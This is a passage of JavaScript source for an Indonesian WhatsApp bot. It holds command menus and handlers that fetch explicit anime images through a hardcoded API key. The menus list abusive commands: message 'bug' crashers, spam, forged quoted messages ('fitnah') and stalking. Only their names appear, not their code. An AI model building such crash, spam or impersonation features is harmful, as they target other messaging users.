                                "rowId": ""
                            }
                        ]
                    }],
                    listType: 1
                }
                giie.sendMessage(from, listMsg, MessageType.listMessage, {
                    contextInfo: {
                        mentionedJid: [stod]
                    },
                    quoted: fgi
                })
                break
            case 'ownermenu':
                menu = `*OWNER FEATURE :*
➪ ${prefix}autorespon [ on/off ]
➪ ${prefix}bc [ teks/reply gif/image/video with caption ]
➪ ${prefix}tobc [ reply sticker/audio with caption ]
➪ ${prefix}return [ javascript ]
➪ ${prefix}clearall
➪ ${prefix}readall
➪ ${prefix}delchat
➪ ${prefix}mute
➪ ${prefix}unmute
➪ ${prefix}public
➪ ${prefix}self
➪ ${prefix}colongsw [ reply story ]
➪ ${prefix}spam [ teks|jumlah ]
➪ ${prefix}demoteall
➪ ${prefix}promoteall
➪ ${prefix}addcmd [ teks reply stc ]
➪ ${prefix}delcmd [ reply stc ]
➪ ${prefix}listcmd
➪ ${prefix}spamsw [ teks|jumlah ]
➪ ${prefix}upswteks [ teks ]
➪ ${prefix}upswlokasi [ teks ]
➪ ${prefix}upswaudio [ reply audio ]
➪ ${prefix}upswvoice [ reply audio ]
➪ ${prefix}upswsticker [ reply sticker ]
➪ ${prefix}upswimage [ reply image with caption ]
➪ ${prefix}upswgif [ reply gif with caption ]
➪ ${prefix}upswvideo [ reply video with caption ]
➪ ${prefix}shutdown
➪ ${prefix}offline [ alasan ]
➪ ${prefix}online
➪ ${prefix}exif [ nama|author ]
➪ ${prefix}setprofile [ reply image ]
➪ ${prefix}setname [ teks ]
➪ ${prefix}setprefix [ multi/nopref ]
➪ ${prefix}setbio [ teks ]
➪ ${prefix}leave
➪ ${prefix}restart
➪ ${prefix}join [ link group ]
➪ ${prefix}addrespon [ tanya|jawab ]
➪ ${prefix}delrespon [ nama ]
➪ ${prefix}q [ reply message ]
➪ ${prefix}d [ reply message ]`
                punten = [{
                    buttonId: 'command',
                    buttonText: {
                        displayText: 'HOME'
                    },
                    type: 1
                }, {
                    buttonId: 'creator',
                    buttonText: {
                        displayText: 'DEVELOPER'
                    },
                    type: 1
                }]
                const mowner = {
                    contentText: `${menu}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: punten,
                    headerType: 1
                }
                await giie.sendMessage(from, mowner, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                break
            case 'bugmenu':
                menu = `*BUG FEATURE :*
➪ ${prefix}virtex
➪ ${prefix}bugkatalog
➪ ${prefix}bugloc
➪ ${prefix}bugrow
➪ ${prefix}buglink
➪ ${prefix}bugbutton
➪ ${prefix}bug [ jumlah ]
➪ ${prefix}bugpc2 [ jumlah ]
➪ ${prefix}bugtroli2 [ jumlah ]
➪ ${prefix}bugtroli3
➪ ${prefix}bugpc
➪ ${prefix}bugcombine
➪ ${prefix}bugtroli
➪ ${prefix}buglokasi
➪ ${prefix}bughole`
                punten = [{
                    buttonId: 'command',
                    buttonText: {
                        displayText: 'HOME'
                    },
                    type: 1
                }, {
                    buttonId: 'creator',
                    buttonText: {
                        displayText: 'DEVELOPER'
                    },
                    type: 1
                }]
                const mbug = {
                    contentText: `${menu}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: punten,
                    headerType: 1
                }
                await giie.sendMessage(from, mbug, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                break
            case 'settingmenu':
                menu = ` *SETTING FEATURE :*
➪ ${prefix}antilink
➪ ${prefix}badword
➪ ${prefix}antidelete
➪ ${prefix}nsfw
➪ ${prefix}welcome
➪ ${prefix}autosticker
➪ ${prefix}autoread
➪ ${prefix}autovn
➪ ${prefix}autoketik
➪ ${prefix}group
➪ ${prefix}mode
➪ ${prefix}autorespon
➪ ${prefix}setprefix
➪ ${prefix}mute
➪ ${prefix}unmute
➪ ${prefix}online
➪ ${prefix}offline [text]
➪ ${prefix}setprofile [ reply image ]
➪ ${prefix}setname [ teks ]
➪ ${prefix}setbio [ teks ]`
                punten = [{
                    buttonId: 'command',
                    buttonText: {
                        displayText: 'HOME'
                    },
                    type: 1
                }, {
                    buttonId: 'creator',
                    buttonText: {
                        displayText: 'DEVELOPER'
                    },
                    type: 1
                }]
                const msetting = {
                    contentText: `${menu}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: punten,
                    headerType: 1
                }
                await giie.sendMessage(from, msetting, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                break
            case 'downloadmenu':
                menu = ` *DOWNLOAD FEATURE :*
➪ ${prefix}infogempa
➪ ${prefix}herolist
➪ ${prefix}herodetail [ hero ]
➪ ${prefix}google [ search ]
➪ ${prefix}gimage [ search ]
➪ ${prefix}wiki [ search ]
➪ ${prefix}mediafire [ link ]
➪ ${prefix}ytsearch [ judul ]
➪ ${prefix}ytmp4 [ link yt ]
➪ ${prefix}ytmp3 [ link yt ]
➪ ${prefix}play [ judul lagu ]
➪ ${prefix}video [ judul video ]
➪ ${prefix}tinyurl [ link ]
➪ ${prefix}fetch [ link ]
➪ ${prefix}igdownload [ link ]
➪ ${prefix}tiktokdownload [ link ]
➪ ${prefix}pinterest [ search ]
➪ ${prefix}film [ judul ]
➪ ${prefix}lirik [ judul ]
➪ ${prefix}tourl [ reply image/video ]
➪ ${prefix}resepmasakan [ judul ]
➪ ${prefix}artimimpi [ teks ]
➪ ${prefix}spekhp [ type ]
➪ ${prefix}zodiak [ teks ]
➪ ${prefix}artinama [ teks ]
➪ ${prefix}jadwaltv [ station ]
➪ ${prefix}kalkulator [ angka ]
➪ ${prefix}fancytext [ teks ]
➪ ${prefix}githubstalk [ username ]
➪ ${prefix}ss [ link ]
➪ ${prefix}tiktokaudio [ link ]
➪ ${prefix}igstory [ link ]
➪ ${prefix}linkwa [link]
➪ ${prefix}carigc [nama]
➪ ${prefix}playstore [ query ]
➪ ${prefix}fb [ link ]
➪ ${prefix}twitter [ link ]`
                punten = [{
                    buttonId: 'command',
                    buttonText: {
                        displayText: 'HOME'
                    },
                    type: 1
                }, {
                    buttonId: 'creator',
                    buttonText: {
                        displayText: 'DEVELOPER'
                    },
                    type: 1
                }]
                const mdownload = {
                    contentText: `${menu}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: punten,
                    headerType: 1
                }
                await giie.sendMessage(from, mdownload, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                break
            case 'stalkingmenu':
                menu = ` *STALKING FEATURE :*
➪ ${prefix}igstalk [ username ] tanpa@`
                punten = [{
                    buttonId: 'command',
                    buttonText: {
                        displayText: 'HOME'
                    },
                    type: 1
                }, {
                    buttonId: 'creator',
                    buttonText: {
                        displayText: 'DEVELOPER'
                    },
                    type: 1
                }]
                const mstalking = {
                    contentText: `${menu}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: punten,
                    headerType: 1
                }
                await giie.sendMessage(from, mstalking, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                break
            case 'makermenu':
                menu = `*MAKER TEXT FEATURE :*
➪ ${prefix}tulis 「 text 」
➪ ${prefix}foliokiri 「 text 」
➪ ${prefix}foliokanan 「 text 」
➪ ${prefix}nuliskanan 「 text 」
➪ ${prefix}nuliskiri 「 text 」
➪ ${prefix}blackpink「 text 」
➪ ${prefix}graffiti「 text 」
➪ ${prefix}textpantai「 text 」
➪ ${prefix}watercolor「 text 」
➪ ${prefix}jokerlogo「 text 」
➪ ${prefix}thunder「 text 」
➪ ${prefix}breakwall「 text 」
➪ ${prefix}matrix [ teks ]
➪ ${prefix}wolflogo [ teks ]
➪ ${prefix}flower [ teks ]
➪ ${prefix}crosslogo [ teks ]
➪ ${prefix}silktext [ teks ]
➪ ${prefix}hartatahta [ teks ]
➪ ${prefix}breakwall [ teks ]
➪ ${prefix}dropwater [ teks ]
➪ ${prefix}gplaybutton [ teks ]
➪ ${prefix}brandlogo [ teks1|text2 ]
➪ ${prefix}pubg [ teks1|text2 ]
➪ ${prefix}glowtext [ teks ]
➪ ${prefix}text1 「 text 」
➪ ${prefix}text2 「 text 」
➪ ${prefix}text3 「 text 」
➪ ${prefix}text4 「 text 」
➪ ${prefix}text5 「 text 」
➪ ${prefix}text6 「 text 」
➪ ${prefix}text7 「 text 」
➪ ${prefix}text8 「 text 」
➪ ${prefix}googletxt 「 text1|text2|text3 」
➪ ${prefix}battlefield 「 text 」
➪ ${prefix}sertiff 「 text 」
➪ ${prefix}sertitolol「 text 」
➪ ${prefix}serti1 「 text 」
➪ ${prefix}serti2 「 text 」
➪ ${prefix}serti3 「 text 」
➪ ${prefix}coffeecup 「 text 」
➪ ${prefix}coffeecup2 「 text 」
➪ ${prefix}neon 「 text 」
➪ ${prefix}glow 「 text 」
➪ ${prefix}summer 「 text 」
➪ ${prefix}flower 「 text 」
➪ ${prefix}burn 「 text 」
➪ ${prefix}quote 「 text 」
➪ ${prefix}wooden 「 text 」
➪ ${prefix}golden 「 text 」`
                punten = [{
                    buttonId: 'command',
                    buttonText: {
                        displayText: 'HOME'
                    },
                    type: 1
                }, {
                    buttonId: 'creator',
                    buttonText: {
                        displayText: 'DEVELOPER'
                    },
                    type: 1
                }]
                const mmaker1 = {
                    contentText: `${menu}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: punten,
                    headerType: 1
                }
                await giie.sendMessage(from, mmaker1, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                menu = `*MAKER IMAGE FEATURE :*
➪ ${prefix}trigger 「 image」
➪ ${prefix}pixelate 「 image 」
➪ ${prefix}horny 「 image 」
➪ ${prefix}simpcard 「 image 」
➪ ${prefix}blur 「 image 」
➪ ${prefix}wasted 「 image 」
➪ ${prefix}jail 「 image 」
➪ ${prefix}greyscale 「 image 」
➪ ${prefix}rainbow 「 image 」
➪ ${prefix}green 「 image 」
➪ ${prefix}red 「 image 」
➪ ${prefix}sepia 「 image 」
➪ ${prefix}calender 「 image 」`
                punten = [{
                    buttonId: 'command',
                    buttonText: {
                        displayText: 'HOME'
                    },
                    type: 1
                }, {
                    buttonId: 'creator',
                    buttonText: {
                        displayText: 'DEVELOPER'
                    },
                    type: 1
                }]
                const mmaker2 = {
                    contentText: `${menu}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: punten,
                    headerType: 1
                }
                await giie.sendMessage(from, mmaker2, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                break
            case 'groupmenu':
                menu = `*GROUP FEATURE :*
➪ ${prefix}getpict [ @tag ]
➪ ${prefix}getname [ reply target ]
➪ ${prefix}getbio [ reply target ]
➪ ${prefix}promote [ @tag ]
➪ ${prefix}demote [ @tag ]
➪ ${prefix}antilink [ on/off ]
➪ ${prefix}antidelete [ on/off ]
➪ ${prefix}nsfw [ on/off ]
➪ ${prefix}welcome [ on/off ]
➪ ${prefix}autosticker [ on/off ]
➪ ${prefix}creategrup [ nama|@tag ]
➪ ${prefix}tictactoe [ @tag ]
➪ ${prefix}delttt
➪ ${prefix}getpp
➪ ${prefix}kick [ @tag ]
➪ ${prefix}add [ nomor ]
➪ ${prefix}getdeskgc
➪ ${prefix}sider [ reply pesan bot ]
➪ ${prefix}hacked [ teks ]
➪ ${prefix}setnamegc [ teks ]
➪ ${prefix}setdeskgc [ teks ]
➪ ${prefix}fitnah [ @tag|teks1|teks2 ]
➪ ${prefix}kontak [ @tag|nama ]
➪ ${prefix}kontag [ @tag|nama ]
➪ ${prefix}opengc
➪ ${prefix}closegc
➪ ${prefix}resetlinkgc
➪ ${prefix}linkgrup
➪ ${prefix}hidetag [ teks ]
➪ ${prefix}totag [ reply media ]`
                punten = [{
                    buttonId: 'command',
                    buttonText: {
                        displayText: 'HOME'
                    },
                    type: 1
                }, {
                    buttonId: 'creator',
                    buttonText: {
                        displayText: 'DEVELOPER'
                    },
                    type: 1
                }]
                const mgroup = {
                    contentText: `${menu}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: punten,
                    headerType: 1
                }
                await giie.sendMessage(from, mgroup, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                break
            case 'nsfwmenu':
                menu = `*NSFW FEATURE :*
➪ ${prefix}trapnime
➪ ${prefix}neko
➪ ${prefix}megumin
➪ ${prefix}blowjob
➪ ${prefix}hentai
➪ ${prefix}awoo
➪ ${prefix}bj 
➪ ${prefix}eroneko
➪ ${prefix}lesbian
➪ ${prefix}anal
➪ ${prefix}yuri
➪ ${prefix}baka
➪ ${prefix}neko2
➪ ${prefix}wallpaperanime
➪ ${prefix}pussy
➪ ${prefix}kitsune
➪ ${prefix}keta
➪ ${prefix}neko2
➪ ${prefix}poke
➪ ${prefix}slap
➪ ${prefix}komiku [ query ]
➪ ${prefix}otaku [ query ]
➪ ${prefix}chara [ query ]`
                punten = [{
                    buttonId: 'command',
                    buttonText: {
                        displayText: 'HOME'
                    },
                    type: 1
                }, {
                    buttonId: 'creator',
                    buttonText: {
                        displayText: 'DEVELOPER'
                    },
                    type: 1
                }]
                const mnsfw = {
                    contentText: `${menu}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: punten,
                    headerType: 1
                }
                await giie.sendMessage(from, mnsfw, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                break
            case 'othermenu':
                menu = `*OTHER FEATURE :*
➪ ${prefix}getscmd
➪ ${prefix}stickmeme [ text ]
➪ ${prefix}stickerwm [ nama|author ]
➪ ${prefix}takestick [ nama|author ]
➪ ${prefix}colong [ reply sticker ]
➪ ${prefix}sticker
➪ ${prefix}semoji [ emoji ]
➪ ${prefix}attp [ teks ]
➪ ${prefix}ttp3d [ teks ]
➪ ${prefix}toimg
➪ ${prefix}trans [ kodebhs|kodebhs|teks ]
➪ ${prefix}translate
➪ ${prefix}tovn [ reply video ]
➪ ${prefix}tomp3 [ reply video ]
➪ ${prefix}tomp4 [ reply sticker gif ]
➪ ${prefix}robot [ reply audio ]
➪ ${prefix}balik [ reply audio ]
➪ ${prefix}bass [ reply audio ]
➪ ${prefix}gemuk [ reply audio ]
➪ ${prefix}detikvn [ reply audio caption angka ]
➪ ${prefix}detikvideo [ reply video caption angka ]
➪ ${prefix}tts [ kodebhs teks ]`
                punten = [{
                    buttonId: 'command',
                    buttonText: {
                        displayText: 'HOME'
                    },
                    type: 1
                }, {
                    buttonId: 'creator',
                    buttonText: {
                        displayText: 'DEVELOPER'
                    },
                    type: 1
                }]
                const mother = {
                    contentText: `${menu}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: punten,
                    headerType: 1
                }
                await giie.sendMessage(from, mother, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                break
            case 'storagemenu':
                menu = `*STORAGE FEATURE :*
➪ ${prefix}addsticker [ nama ]
➪ ${prefix}delsticker [ nama ]
➪ ${prefix}addvn [ nama ]
➪ ${prefix}delvn [ nama ]
➪ ${prefix}addimage [ nama ]
➪ ${prefix}delimage [ nama ]
➪ ${prefix}listimage
➪ ${prefix}liststicker
➪ ${prefix}listvn`
                punten = [{
                    buttonId: 'command',
                    buttonText: {
                        displayText: 'HOME'
                    },
                    type: 1
                }, {
                    buttonId: 'creator',
                    buttonText: {
                        displayText: 'DEVELOPER'
                    },
                    type: 1
                }]
                const mstorage = {
                    contentText: `${menu}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: punten,
                    headerType: 1
                }
                await giie.sendMessage(from, mstorage, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                break
            case 'botmenu':
                menu = `*CREATE BOT :*
➪ MULAI : untuk jadi bot
➪ STOP : untuk stop jadi bot`
                punten = [{
                    buttonId: 'jadibot',
                    buttonText: {
                        displayText: 'MULAI'
                    },
                    type: 1
                }, {
                    buttonId: 'stopjadibot',
                    buttonText: {
                        displayText: 'STOP'
                    },
                    type: 1
                }]
                const mbot = {
                    contentText: `${menu}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: punten,
                    headerType: 1
                }
                await giie.sendMessage(from, mbot, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                break

            case 'funmenu':
                menu = `*FUN FEATURE :*
➪ ${prefix}caripesan [ teks|jumlah ]
➪ ${prefix}slots
➪ ${prefix}suit [ gunting/batu/kertas ]
➪ ${prefix}tag [ nomor ]
➪ ${prefix}tagme
➪ ${prefix}readmore [ teks1|teks2 ]
➪ ${prefix}fitnahpc [ nomor|teks1|teks2 ]
➪ ${prefix}chat [ nomor|teks ]
➪ ${prefix}fdeface [ replyimg link|teks1|teks2 ]
➪ ${prefix}listgrup
➪ ${prefix}baileys [ reply message ]
➪ ${prefix}getcaption [ reply message ]
➪ ${prefix}pantun
➪ ${prefix}quotes
➪ ${prefix}bijak
➪ ${prefix}fakta
➪ ${prefix}tospam [ reply audio/sticker/image|jumlah ]
➪ ${prefix}sharelock [ teks1|teks2 ]
➪ ${prefix}dadu`
                punten = [{
                    buttonId: 'command',
                    buttonText: {
                        displayText: 'HOME'
                    },
                    type: 1
                }, {
                    buttonId: 'creator',
                    buttonText: {
                        displayText: 'DEVELOPER'
                    },
                    type: 1
                }]
                const mfun = {
                    contentText: `${menu}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: punten,
                    headerType: 1
                }
                await giie.sendMessage(from, mfun, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                break
                //Hardianto nsfw
            case 'otaku':
                if (!c) return reply('judul animenya?')
                reply(mess.wait)
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                let anime = await gionov.otakudesu(c)
                rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
                ram = await getBuffer(anime.img)
                giie.sendMessage(from, ram, image, {
                    quoted: mek,
                    caption: rem
                })
                break
            case 'komiku':
                if (!c) return reply('judul animenya?')
                reply(mess.wait)
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                let komik = await gionov.komiku(c)
                result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
                sendMediaURL(from, komik.image, result)
                break
            case 'chara':
                if (!c) return reply('judul animenya?')
                reply(mess.wait)
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                let im = await gionov.chara(c)
                let acak = im[Math.floor(Math.random() * im.length)]
                let li = await getBuffer(acak)
                await giie.sendMessage(from, li, image, {
                    quoted: mek
                })
                break
            case 'yuri':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                kon = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=yuri&apikey=hardianto`)
                anu = await getBuffer(kon)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'giie':
                buttonss = [{
                    buttonId: `igstalk giiexsala`,
                    buttonText: {
                        displayText: 'INSTAGRAM🩰'
                    },
                    type: 1
                }, {
                    buttonId: `creator`,
                    buttonText: {
                        displayText: 'WHATSAPP🧸'
                    },
                    type: 1
                }]
                const bum = {
                    contentText: "*シ︎License Work:*",
                    footerText: '_Berkat kesabaran, ketelitian, dan support my baby (gionova) & my wife (echa exsala) telah berhasil menciptakan program whatsapp web, Ini adalah bots whatsapp buatan_ _*Ayogi Akbar Afrenggo*_\n_bots ini sengaja di rancang oleh_ _*Ayogi*_ _untuk mempermudah anda menggunakan media whatsapp, dimana didalam program nya telah di sisipkan berbagai fitur canggih dan menarik, dengan susunan variable code editing/script yg aman tanpa ada unsur kejahatan seperti (hack, sadap, bypass, dll), bots ini hanya untuk hiburan saja_\n\n*POWERED BY: AYOGI AKBAR AFRENGGO*\n\n♥︎ Thanks to big support with Gionova & Echa Exsala',
                    buttons: buttonss,
                    headerType: 1
                }
                await giie.sendMessage(from, bum, MessageType.buttonsMessage, {
                    quoted: fstick
                })
                break
            case 'anal':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                aku = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=anal&apikey=hardianto`)
                kon = await getBuffer(aku)
                giie.sendMessage(from, kon, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'lesbian':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                kau = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=lesbian&apikey=hardianto`)
                kon = await getBuffer(kau)
                giie.sendMessage(from, kon, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'eroneko':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroNeko&apikey=hardianto`)
                kon = await getBuffer(hai)
                giie.sendMessage(from, kon, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'bj':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=bJ&apikey=hardianto`)
                kon = await getBuffer(hai)
                giie.sendMessage(from, kon, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'kitsune':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=kitsune&apikey=hardianto`)
                kon = await getBuffer(hai)
                giie.sendMessage(from, kon, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'pussy':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=pussy&apikey=hardianto`)
                giie.sendMessage(from, hai, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'wallpaperanime':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=wallpaper&apikey=hardianto`)
                kon = await getBuffer(hai)
                giie.sendMessage(from, kon, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'neko2':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`)
                kon = await getBuffer(hai)
                giie.sendMessage(from, kon, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'baka':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=baka&apikey=hardianto`)
                kon = await getBuffer(hai)
                giie.sendMessage(from, kon, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'slap':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=slap&apikey=hardianto`)
                kon = await getBuffer(hai)
                giie.sendMessage(from, kon, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'poke':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=poke&apikey=hardianto`)
                kon = await getBuffer(hai)
                giie.sendMessage(from, kon, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'neko2':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`)
                kon = await getBuffer(hai)
                giie.sendMessage(from, kon, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'keta':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=keta&apikey=hardianto`)
                kon = await getBuffer(hai)
                giie.sendMessage(from, kon, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'awoo':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
                buffer = await getBuffer(anu.url)
                giie.sendMessage(from, buffer, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'blowjob':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
                buffer = await getBuffer(anu.url)
                giie.sendMessage(from, buffer, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'hentai':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
                buffer = await getBuffer(anu.url)
                giie.sendMessage(from, buffer, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'megumin':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
                buffer = await getBuffer(anu.url)
                giie.sendMessage(from, buffer, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'neko':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
                buffer = await getBuffer(anu.url)
                giie.sendMessage(from, buffer, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'trapnime':
                if (!isGroup) return reply(mess.only.group)
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
                reply(mess.wait)
                anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
                buffer = await getBuffer(anu.url)
                giie.sendMessage(from, buffer, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
                //Done
            case 'nulis':
